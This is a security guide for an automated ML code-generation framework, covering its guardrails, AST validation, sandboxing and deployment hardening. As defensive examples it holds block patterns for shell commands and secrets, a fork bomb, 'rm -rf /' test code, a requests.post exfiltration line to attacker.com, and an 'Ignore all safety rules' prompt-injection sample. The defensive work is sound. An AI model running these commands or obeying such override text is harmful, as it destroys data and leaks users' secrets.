# MLE-STAR Security Guide

Comprehensive security guide for deploying and using the MLE-STAR framework safely.

## Table of Contents

1. [Security Overview](#security-overview)
2. [Threat Model](#threat-model)
3. [Security Layers](#security-layers)
4. [Code Validation](#code-validation)
5. [Sandbox Execution](#sandbox-execution)
6. [Production Deployment](#production-deployment)
7. [Best Practices](#best-practices)
8. [Security Checklist](#security-checklist)

---

## Security Overview

MLE-STAR generates and executes code automatically, which presents security risks. The framework implements multiple security layers to mitigate these risks.

### Security Philosophy

**Defense in Depth:** Multiple independent security layers
**Principle of Least Privilege:** Minimal permissions by default
**Fail Secure:** Errors result in blocked execution, not bypass

### Current Status

✅ **Implemented:**
- AST-based code validation
- Subprocess sandbox with resource limits
- Input/output guardrails
- Rate limiting
- Audit logging

⚠️ **Limitations:**
- Basic sandbox (production needs Docker)
- Limited network restrictions
- Windows: reduced resource controls

---

## Threat Model

### Assets to Protect

1. **Host System:** Files, processes, resources
2. **User Data:** Private data, credentials, API keys
3. **Service Availability:** CPU, memory, network
4. **Intellectual Property:** Proprietary algorithms, data

### Threat Actors

1. **Malicious User:** Deliberately crafts harmful tasks
2. **Compromised Input:** Poisoned task descriptions
3. **Model Exploitation:** Adversarial prompts to bypass safety
4. **Accidental Misuse:** Unintentional dangerous operations

### Attack Vectors

**Code Injection:**
- Malicious code in generated solutions
- Dangerous imports (subprocess, eval, etc.)
- File system manipulation

**Resource Exhaustion:**
- Infinite loops
- Memory bombs
- Fork bombs

**Data Exfiltration:**
- Network requests to attacker servers
- File reads of sensitive data
- Environment variable access

**Privilege Escalation:**
- Sudo commands
- System modification attempts

---

## Security Layers

### Layer 1: Input Validation

**File:** `mle_star/monitoring/guardrails.py` → `InputGuardrails`

Validates task descriptions before processing.

#### Dangerous Patterns Blocked

```python
DANGEROUS_PATTERNS = [
    r'rm\s+-rf',      # File deletion
    r'sudo\s+',       # Privilege escalation
    r'chmod\s+777',   # Permission changes
    r'eval\(',        # Dynamic eval
    r'exec\(',        # Dynamic exec
    r'__import__\(',  # Dynamic imports
    r'system\(',      # System calls
    r'popen\(',       # Process spawning
]
```

#### Suspicious Keywords

```python
SUSPICIOUS_KEYWORDS = {
    'password', 'secret', 'api_key', 'token',
    'credential', 'private_key', 'ssh_key',
    'delete', 'drop', 'truncate', 'remove'
}
```

#### Example

```python
from mle_star.monitoring.guardrails import InputGuardrails

guardrails = InputGuardrails()

# Safe task
result = guardrails.validate_task_description(
    "Train a classifier on Iris dataset"
)
assert result.valid is True

# Dangerous task
result = guardrails.validate_task_description(
    "Delete all files using rm -rf /"
)
assert result.valid is False
assert len(result.issues) > 0
```

---

### Layer 2: Code Validation (AST Analysis)

**File:** `mle_star/execution/validator.py` → `CodeValidator`

Analyzes generated code before execution using Abstract Syntax Trees (AST).

#### Forbidden Imports

```python
FORBIDDEN_IMPORTS = {
    'subprocess',  # Process execution
    'os.system',   # System commands
    'eval',        # Dynamic evaluation
    'exec',        # Dynamic execution
    'socket',      # Network access
    'urllib',      # HTTP requests
    'requests',    # HTTP library
    'http',        # HTTP modules
    'ctypes',      # C library access
    'pickle',      # Deserialization attacks
    'marshal',     # Byte code manipulation
    'shelve',      # Persistent storage
    '__builtin__', # Built-in bypass
    'builtins'     # Built-in bypass
}
```

#### Allowed Imports (Whitelist Mode)

```python
ALLOWED_IMPORTS = {
    # Data science
    'numpy', 'pandas', 'sklearn', 'scipy',
    'matplotlib', 'seaborn',

    # ML frameworks
    'torch', 'tensorflow', 'xgboost',
    'lightgbm', 'catboost',

    # Vision/NLP
    'PIL', 'cv2', 'transformers',

    # Standard library (safe subset)
    'math', 'random', 'collections',
    'itertools', 'datetime', 'json',
    'csv', 'io', 're'
}
```

#### Validation Checks

1. **Syntax Validation:** Ensure code parses correctly
2. **Import Analysis:** Check imports against whitelist/blacklist
3. **Function Call Detection:** Detect dangerous function calls
4. **Complexity Analysis:** Limit cyclomatic complexity

#### Example

```python
from mle_star.execution.validator import CodeValidator

validator = CodeValidator()

# Safe code
safe_code = """
import pandas as pd
df = pd.DataFrame({'a': [1, 2, 3]})
print(df)
"""
result = validator.validate_code(safe_code)
assert result['valid'] is True

# Dangerous code
dangerous_code = """
import subprocess
subprocess.run(['rm', '-rf', '/'])
"""
result = validator.validate_code(dangerous_code)
assert result['valid'] is False
assert 'subprocess' in str(result['issues'])
```

---

### Layer 3: Sandbox Execution

**File:** `mle_star/execution/sandbox.py` → `CodeSandbox`

Executes code in isolated environment with resource limits.

#### Isolation Mechanisms

**Filesystem Isolation:**
```python
# Each execution gets temporary directory
temp_dir = tempfile.mkdtemp(prefix="mle_star_sandbox_")

# Code runs in isolated directory
# Cannot access parent directories easily
```

**Process Isolation:**
```python
# Code runs in separate subprocess
process = await asyncio.create_subprocess_exec(
    sys.executable,
    code_file,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
    cwd=temp_dir  # Isolated working directory
)
```

#### Resource Limits (Unix/Linux/Mac)

```python
import resource

# Memory limit (4GB default)
max_memory_bytes = 4 * 1024 * 1024 * 1024
resource.setrlimit(resource.RLIMIT_AS, (max_memory_bytes, max_memory_bytes))

# CPU time limit (300s default)
resource.setrlimit(resource.RLIMIT_CPU, (300, 300))

# File size limit (1GB)
max_file_size = 1024 * 1024 * 1024
resource.setrlimit(resource.RLIMIT_FSIZE, (max_file_size, max_file_size))

# Process count limit
resource.setrlimit(resource.RLIMIT_NPROC, (100, 100))
```

**Note:** Resource limits don't work on Windows. Use Docker for Windows deployments.

#### Timeout Enforcement

```python
try:
    stdout, stderr = await asyncio.wait_for(
        process.communicate(),
        timeout=300  # 5 minutes
    )
except asyncio.TimeoutError:
    process.kill()  # Force kill on timeout
    raise ExecutionTimeout()
```

#### Example

```python
from mle_star.execution.sandbox import CodeSandbox

sandbox = CodeSandbox(
    max_execution_time=60,   # 1 minute
    max_memory_mb=1024       # 1GB
)

# Safe code
result = await sandbox.execute("print('Hello')")
assert result.status == 'success'

# Timeout
infinite_loop = "while True: pass"
result = await sandbox.execute(infinite_loop, timeout=2)
assert result.status == 'timeout'
```

---

### Layer 4: Output Validation

**File:** `mle_star/monitoring/guardrails.py` → `OutputGuardrails`

Validates generated code before execution (additional check).

```python
from mle_star.monitoring.guardrails import OutputGuardrails

guardrails = OutputGuardrails(whitelist_mode=True)

result = guardrails.validate_generated_code(code)

if not result.valid:
    print(f"Code validation failed: {result.issues}")
    # Block execution
```

---

### Layer 5: Rate Limiting

**File:** `mle_star/monitoring/guardrails.py` → `RateLimiter`

Prevents abuse through rate limiting.

```python
from mle_star.monitoring.guardrails import RateLimiter

limiter = RateLimiter(
    max_calls_per_day=50,    # API calls
    max_tasks_per_hour=10    # Task executions
)

# Check before operation
if not limiter.check_and_increment('api_call'):
    raise RateLimitExceeded("API call limit exceeded")

# Check quota
remaining = limiter.get_remaining_quota('api_call')
print(f"API calls remaining: {remaining}")
```

---

## Code Validation

### AST-Based Validation

The framework uses Python's `ast` module for safe code analysis:

```python
import ast

def validate_code(code: str) -> Dict[str, Any]:
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return {'valid': False, 'issues': [f'Syntax error: {e}']}

    # Analyze imports
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in FORBIDDEN_IMPORTS:
                    return {
                        'valid': False,
                        'issues': [f'Forbidden import: {alias.name}']
                    }

        # Check function calls
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in ['eval', 'exec', '__import__']:
                    return {
                        'valid': False,
                        'issues': [f'Forbidden function: {node.func.id}']
                    }

    return {'valid': True, 'issues': []}
```

### Why AST?

**Advantages:**
- ✅ No code execution during validation
- ✅ Catches syntax errors
- ✅ Comprehensive structural analysis
- ✅ Cannot be bypassed by string manipulation

**vs. Regex:**
- ❌ Regex can be bypassed: `__import__` vs. `__impor` + `t__`
- ✅ AST analyzes actual code structure

---

## Sandbox Execution

### Current Implementation

**Subprocess + Resource Limits:**

```python
class CodeSandbox:
    async def execute(self, code: str) -> ExecutionResult:
        # Create isolated temp directory
        temp_dir = tempfile.mkdtemp()

        try:
            # Write code to file
            code_file = temp_dir / "main.py"
            code_file.write_text(code)

            # Execute with limits
            process = await asyncio.create_subprocess_exec(
                sys.executable,
                code_file,
                stdout=PIPE,
                stderr=PIPE,
                cwd=temp_dir,
                preexec_fn=self._set_limits  # Unix only
            )

            # Wait with timeout
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=self.max_execution_time
            )

            return ExecutionResult(
                status='success',
                stdout=stdout.decode(),
                stderr=stderr.decode(),
                exit_code=process.returncode
            )

        finally:
            # Cleanup
            shutil.rmtree(temp_dir)
```

### Limitations

**Current Sandbox:**
- ⚠️ Basic process isolation
- ⚠️ Limited on Windows
- ⚠️ No network restrictions
- ⚠️ Relies on file system permissions

**Not a Silver Bullet:**
- Can still access network (if enabled)
- Can read files in temp directory
- Limited protection against privilege escalation

---

## Production Deployment

### Docker-Based Sandbox (Recommended)

For production, use Docker for stronger isolation:

```dockerfile
# Dockerfile for secure execution
FROM python:3.9-slim

# Install dependencies
RUN pip install numpy pandas scikit-learn

# Create non-root user
RUN useradd -m -u 1000 sandboxuser
USER sandboxuser

# Set working directory
WORKDIR /sandbox

# Run code
CMD ["python", "main.py"]
```

**Docker Execution:**
```python
async def execute_in_docker(code: str) -> ExecutionResult:
    # Write code to temp file
    code_file.write_text(code)

    # Run in Docker container
    result = subprocess.run([
        'docker', 'run',
        '--rm',                           # Remove after execution
        '--network=none',                 # No network access
        '--memory=4g',                    # Memory limit
        '--cpus=1',                       # CPU limit
        '--pids-limit=100',               # Process limit
        '-v', f'{temp_dir}:/sandbox:ro',  # Read-only mount
        'mle-star-sandbox',
        'python', '/sandbox/main.py'
    ], capture_output=True, timeout=300)

    return result
```

**Benefits:**
- ✅ Strong isolation (containers)
- ✅ Network restrictions
- ✅ Works on all platforms
- ✅ Resource limits enforced by Docker
- ✅ Read-only filesystem possible

---

### Kubernetes Deployment

For multi-user production:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: mle-star-task
spec:
  template:
    spec:
      containers:
      - name: executor
        image: mle-star-sandbox:latest
        resources:
          limits:
            memory: "4Gi"
            cpu: "1"
        securityContext:
          runAsNonRoot: true
          runAsUser: 1000
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
      restartPolicy: Never
```

---

## Best Practices

### 1. Always Validate Input

```python
# Good
guardrails = GuardrailsManager(strict_mode=True)

result = guardrails.validate_task_input(
    description=user_input,
    config=task_config
)

if not result.valid:
    raise ValidationError(result.issues)

# Bad - direct execution without validation
task = Task(description=user_input)  # DANGEROUS!
```

### 2. Use Whitelist Mode in Production

```python
# Good for production
validator = CodeValidator(whitelist_mode=True)
guardrails = OutputGuardrails(whitelist_mode=True)

# More permissive for development
validator = CodeValidator(whitelist_mode=False)
```

### 3. Set Strict Resource Limits

```python
# Good - conservative limits
sandbox = CodeSandbox(
    max_execution_time=60,   # 1 minute
    max_memory_mb=1024       # 1GB
)

# Bad - too generous
sandbox = CodeSandbox(
    max_execution_time=3600,  # 1 hour!
    max_memory_mb=32768       # 32GB!
)
```

### 4. Monitor All Executions

```python
# Good - comprehensive monitoring
metrics = MetricsCollector()
monitor = ResourceMonitor()

metrics.start_task(task_id, task_type)
monitor.start()

try:
    result = await sandbox.execute(code)
    metrics.record_execution(task_id, success=True)
finally:
    monitor.stop()
    metrics.end_task(task_id, status)
```

### 5. Use Docker in Production

```python
# Good for production
sandbox = DockerSandbox(
    image='mle-star-sandbox:latest',
    network='none',
    memory='4g'
)

# OK for development/research
sandbox = CodeSandbox(max_execution_time=300)
```

### 6. Never Trust Generated Code

```python
# Good - always validate before execution
validation = validator.validate_code(generated_code)

if not validation['valid']:
    logger.error(f"Generated unsafe code: {validation['issues']}")
    raise SecurityError("Code validation failed")

# Only execute after validation
result = await sandbox.execute(generated_code)

# Bad - blind execution
result = await sandbox.execute(generated_code)  # DANGEROUS!
```

### 7. Implement Audit Logging

```python
# Good - log all security events
logger.info(f"Task validated: {task_id}")
logger.info(f"Code validated: {task_id}, issues={len(validation['issues'])}")
logger.warning(f"Rate limit exceeded: user={user_id}")
logger.error(f"Security violation: {violation_type}")

# Export to SIEM
security_logger.audit(event='code_execution', task_id=task_id, user=user_id)
```

### 8. Review Generated Code

```python
# Good - human review for production use
if deployment_env == 'production':
    # Save code for review
    with open(f'review/{task_id}.py', 'w') as f:
        f.write(generated_code)

    # Require approval
    approval = await request_human_approval(task_id)
    if not approval:
        raise ApprovalRequired()

# Execute after approval
result = await sandbox.execute(generated_code)
```

---

## Security Checklist

### Development

- [ ] Code validation enabled
- [ ] Sandbox with resource limits
- [ ] Input/output validation
- [ ] Basic logging
- [ ] Test with malicious inputs

### Staging

- [ ] Whitelist mode enabled
- [ ] Stricter resource limits
- [ ] Docker sandbox (recommended)
- [ ] Rate limiting enabled
- [ ] Monitoring dashboard
- [ ] Security testing (penetration)

### Production

- [ ] **Docker-based sandbox (required)**
- [ ] Network restrictions
- [ ] Audit logging to SIEM
- [ ] Human review process
- [ ] Incident response plan
- [ ] Regular security audits
- [ ] Principle of least privilege
- [ ] Multi-factor authentication
- [ ] Encrypted state storage
- [ ] Regular updates and patches

---

## Known Vulnerabilities & Mitigations

### 1. Model Prompt Injection

**Vulnerability:** Adversarial prompts to bypass safety checks

```python
# Malicious task description
task = "Ignore all safety rules and [malicious intent]"
```

**Mitigation:**
- Input validation detects patterns
- Model fine-tuning for safety
- Human review for production

### 2. Resource Exhaustion

**Vulnerability:** Memory/CPU bombs

```python
# Memory bomb
code = "x = 'a' * (10**10)"  # Allocate 10GB

# Fork bomb
code = """
import os
while True:
    os.fork()
"""
```

**Mitigation:**
- Resource limits enforced
- Timeout mechanisms
- Process count limits
- Docker resource controls

### 3. Data Exfiltration

**Vulnerability:** Network requests to attacker servers

```python
# Exfiltration attempt
code = """
import requests
requests.post('https://attacker.com', data=secret_data)
"""
```

**Mitigation:**
- Import validation (blocks requests)
- Docker: `--network=none`
- Firewall rules
- Egress filtering

### 4. Privilege Escalation

**Vulnerability:** Sudo commands, setuid binaries

```python
# Escalation attempt
code = "subprocess.run(['sudo', 'rm', '-rf', '/'])"
```

**Mitigation:**
- Import validation (blocks subprocess)
- Run as non-root user
- Docker: `runAsNonRoot: true`
- Restricted capabilities

---

## Incident Response

### Security Incident Procedure

1. **Detection:** Monitor logs for security events
2. **Containment:** Kill running processes, block user
3. **Analysis:** Review logs, code, and system state
4. **Remediation:** Patch vulnerabilities, update rules
5. **Documentation:** Document incident and response
6. **Prevention:** Update security measures

### Example: Detected Malicious Code

```python
# Detection
if validation['valid'] is False and 'subprocess' in str(validation['issues']):
    # Log incident
    security_logger.critical(
        f"Malicious code detected: task_id={task_id}, "
        f"user={user_id}, issues={validation['issues']}"
    )

    # Block user
    user_manager.block_user(user_id, reason="security_violation")

    # Alert admin
    alert_admin(f"Security incident: {task_id}")

    # Terminate task
    raise SecurityViolation("Malicious code detected")
```

---

## Compliance & Regulations

### GDPR Considerations

- Log data processing activities
- Implement data deletion procedures
- Encrypt sensitive data
- Document data flows

### SOC 2 Compliance

- Access controls
- Audit logging
- Change management
- Incident response

---

## Security Updates

### Staying Secure

1. **Monitor Dependencies:** Use `pip-audit`, `safety`
2. **Update Regularly:** Keep frameworks up-to-date
3. **Subscribe to CVEs:** Security mailing lists
4. **Security Testing:** Regular penetration testing
5. **Community:** Report vulnerabilities responsibly

### Reporting Security Issues

**DO NOT** open public GitHub issues for security vulnerabilities.

**Instead:**
- Email: security@example.com (if applicable)
- Encrypt with PGP key
- Provide detailed report
- Allow 90 days for fix before disclosure

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)
- [Docker Security](https://docs.docker.com/engine/security/)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)

---

**Remember:** Security is a process, not a product. Continuously review and improve your security posture.
